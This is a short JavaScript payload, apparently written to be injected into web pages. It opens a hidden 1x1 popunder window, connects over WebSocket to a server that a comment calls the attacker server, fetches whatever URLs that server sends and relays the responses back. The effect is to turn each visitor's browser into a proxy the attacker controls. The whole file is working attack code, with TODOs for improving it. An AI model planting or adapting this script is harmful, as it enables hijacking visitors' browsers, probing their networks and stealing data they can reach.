(() => {
    const popunderenabled = true // TODO do this better
    let popunder;
    if(popunderenabled) {
        setTimeout(()=>{
            popunder = window.open(window.location.href, null, 'width=1,height=1,left=0,top=0,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=no').blur() // TODO make it an actual popunder (currently is a popup)
        }, 1)
    }

    (() => {
        // TODO build file using a config containing the attacker server
        const id = Math.floor(Math.random() * (2 ** 16))
        const ws_url = 'ws://localhost:8080/ws/' + id
        const ws = new WebSocket(ws_url)

        ws.onmessage = (msg) => {
            const msgobj = JSON.parse(msg.data)
            const url = msgobj.url
            // TODO make a request object to allow for more configurable requests
            fetch(url)
            .then(res => {
                res.text()
                .then(restext => {
                    ws.send(JSON.stringify(restext))
                })
                .catch(err => ws.send(err))
            })
            .catch(err => ws.send(err))
        }
    })()
})()
